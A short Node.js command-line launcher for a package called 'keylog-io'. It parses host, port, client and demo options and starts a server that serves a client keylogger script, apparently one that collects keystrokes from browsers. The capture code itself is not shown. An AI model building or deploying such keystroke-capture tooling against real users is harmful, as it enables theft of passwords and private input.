#!/usr/bin/env node

const program = require('commander');
const keyloggerServer = require('../main');
const {
  name,
  version,
  description
} = require('../package.json');

program
  .name('keylog-io')
  .version(version)
  .description(description)
  .option('-h, --hostname <host>', 'The address where start the server', '0.0.0.0')
  .option('-p, --port <port>', 'The port where start the server', 9000)
  .option('-c, --client', 'Serve the client keylogger file')
  .option('-d, --demo', 'Serve the demo client page')
  .parse(process.argv);

// Start the server
keyloggerServer({
  serveDemo: program.demo,
  serveClient: program.client,
  hostname: program.hostname,
  port: program.port
});
